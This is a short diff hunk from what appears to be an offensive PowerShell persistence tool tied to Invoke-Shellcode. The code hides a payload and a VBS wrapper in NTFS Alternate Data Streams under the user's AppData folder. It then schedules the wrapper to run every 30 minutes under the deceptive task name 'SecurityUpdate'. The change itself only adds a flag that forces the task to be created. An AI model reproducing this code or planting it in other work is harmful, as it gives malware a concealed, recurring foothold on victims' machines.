@@ -78,7 +78,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
     #Create Alternate Data Streams for Payload and Wrapper
     $CreatePayloadADS = {cmd /C "echo $payload > $env:USERPROFILE\AppData:$textFile"}
     $CreateWrapperADS = {cmd /C "echo $vbtext > $env:USERPROFILE\AppData:$vbsFile"}
-    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN SecurityUpdate /TR $env:USERPROFILE\AppData:$vbsFile"}
+    $CreateScheduleADS = {cmd /c "SCHTASKS /Create /SC MINUTE /MO 30 /TN SecurityUpdate /TR $env:USERPROFILE\AppData:$vbsFile /F"}
     Invoke-Command -ScriptBlock $CreatePayloadADS
     "Payload stored in $env:USERPROFILE\AppData:$textFile"
     Invoke-Command -ScriptBlock $CreateWrapperADS
